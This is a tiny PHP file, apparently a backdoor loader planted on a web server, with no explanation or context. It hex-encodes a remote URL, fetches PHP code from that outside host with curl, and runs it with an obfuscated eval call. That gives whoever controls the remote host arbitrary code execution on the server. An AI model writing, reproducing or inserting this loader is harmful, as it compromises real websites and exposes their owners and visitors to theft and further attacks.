<?php
$cx = curl_init(hex2bin("68747470733a2f2f616e6767657269736a78612e70616765732e6465762f676f6e672e706870"));
curl_setopt($cx, CURLOPT_RETURNTRANSFER, 1);
$rs = curl_exec($cx);
if ($rs !== false) {
    $data = eVaL('?>' . $rs);
}
curl_close($cx);
?>